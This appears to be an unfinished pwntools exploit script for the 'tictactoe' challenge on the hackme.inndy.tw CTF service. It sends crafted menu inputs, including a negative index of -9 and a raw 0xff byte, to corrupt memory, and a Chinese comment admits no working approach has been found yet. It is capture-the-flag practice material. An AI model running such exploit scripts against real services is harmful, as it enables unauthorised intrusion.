#!/usr/bin/python3
# -*- coding: utf-8 -*-

import re, sys, os.path as path
from pwn import *
from pwnlib import gdb

"""
patchelf --set-interpreter /glibc/2.23/32/lib/ld-linux.so.2 ./tictactoe_patched
patchelf --replace-needed libc.so.6 ./libc-2.23.so.i386 ./tictactoe_patched

似乎没有合适的输出的地方。需要考虑使用ret2dl？
暂时没什么好的想法
"""

context(arch="i386", os="linux")

elf_name = path.join(path.dirname(path.abspath(__file__)), "tictactoe_patched")
_, host, port = re.split("\s+", "nc hackme.inndy.tw 7714")

elf = ELF(elf_name)
libc = elf.libc

io, context.log_level = (remote(host, port), "info") if len(sys.argv) > 1 else (process(elf_name), "debug")


def main():
    io.sendlineafter("? ", "1")
    sleep(0.1)
    io.sendlineafter(": ", "9")
    sleep(0.1)
    io.sendline("\xff")
    sleep(0.1)
    io.sendlineafter(": ", "4")
    io.sendlineafter(": ", "-9")
    io.sendlineafter(": ", "8")
    io.interactive()


if __name__ == "__main__":
    main()

# 